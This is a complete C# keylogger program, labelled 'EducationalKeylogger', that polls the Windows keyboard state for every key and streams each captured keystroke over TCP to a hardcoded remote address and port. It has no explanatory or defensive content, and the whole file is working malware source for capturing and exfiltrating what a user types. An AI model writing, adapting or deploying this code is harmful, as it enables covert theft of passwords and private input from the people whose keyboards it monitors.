using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace EducationalKeylogger
{
    class Program
    {
        private const string SERVER_IP = "192.168.0.224"; 
        private const int PORT = 9999;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        static void Main()
        {
            TcpClient client = null;
            NetworkStream stream = null;

            try
            {
                client = new TcpClient();
                client.Connect(SERVER_IP, PORT);
                stream = client.GetStream();

                bool[] keyPressed = new bool[256];

                while (true)
                {
                    Thread.Sleep(10);

                    if ((GetAsyncKeyState(27) & 0x8000) != 0)
                    {
                        break;
                    }


                    for (int i = 8; i < 256; i++)
                    {
                        short keyState = GetAsyncKeyState(i);

                        if ((keyState & 0x8000) != 0 && !keyPressed[i])
                        {
                            keyPressed[i] = true;

                            string key = GetKeyName(i);
                            if (!string.IsNullOrEmpty(key))
                            {
                                byte[] data = Encoding.UTF8.GetBytes(key);
                                stream.Write(data, 0, data.Length);
                                stream.Flush();
                                Console.Write(key);
                            }
                        }
                        else if ((keyState & 0x8000) == 0)
                        {
                            keyPressed[i] = false;
                        }
                    }
                }
            }
            catch (SocketException ex)
            {
            }
            catch (Exception ex)
            {
            }
            finally
            {
                stream?.Close();
                client?.Close();
                Console.ReadKey();
            }
        }

        static string GetKeyName(int keyCode)
        {
            // Teclas especiales
            switch (keyCode)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]\n";
                case 32: return " ";
                case 160: case 161: return ""; // Shift 
                case 162: case 163: return ""; // Ctrl 
                case 164: case 165: return ""; // Alt 
                default:
                    if (keyCode >= 48 && keyCode <= 90) // 0-9, A-Z
                        return ((char)keyCode).ToString();
                    if (keyCode >= 96 && keyCode <= 105) // Numpad 0-9
                        return ((char)(keyCode - 48)).ToString();
                    return "";
            }
        }
    }
}